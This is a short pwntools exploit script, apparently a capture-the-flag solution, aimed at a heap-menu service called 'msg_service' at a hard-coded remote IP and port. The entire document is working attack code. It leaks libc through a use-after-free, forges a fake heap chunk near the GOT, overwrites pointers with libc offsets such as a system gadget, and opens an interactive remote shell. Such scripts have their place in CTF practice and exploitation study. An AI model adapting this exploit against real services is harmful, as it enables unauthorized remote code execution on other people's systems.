from pwn import *


#r = process(["./msg_service"])

#r = remote("localhost",56746)
r = remote("159.65.125.233", 6003)

def add(size,data):
	r.sendlineafter("choice : ","0")
	r.sendlineafter(":",str(size))
	r.sendafter(":",data)

def remove(idx):
	r.sendlineafter("choice : ","1")
	r.sendlineafter(":",str(idx))

def show(idx):
	r.sendlineafter("choice : ","2")
	r.sendlineafter(":",str(idx))
	r.recvuntil("Message : ")
	return u64(r.recvline()[:-1].ljust(8,'\x00'))

def change(idx):
	r.sendlineafter("choice : ","3")
	r.sendlineafter(":",str(idx))

add(0x100,"a")
show(0)
remove(0)
libc = show(0) -0x3c4c78
print "libc",hex(libc)
#r.interactive()


add(0x50,"a") #1
add(0x50,p64(0x0)+p64(0x0)+p64(0x61)+p64(0x602000-0x8+0x2)) #2
add(0x80,"a")


remove(2)
remove(1)

for _ in range(6):
	change(1)
for _ in range(3):
	change(3)

change(1)
change(1)

add(0x50,"a")
add(0x50,"sh")
add(0x50,"aaaaaa"+p64(libc)+p64(0x45390+libc)+p64(libc+0x36e80))


r.sendlineafter("choice : ","2")
r.sendlineafter(":","5")
r.recvrepeat(1)
print "Get Shell"
r.interactive()

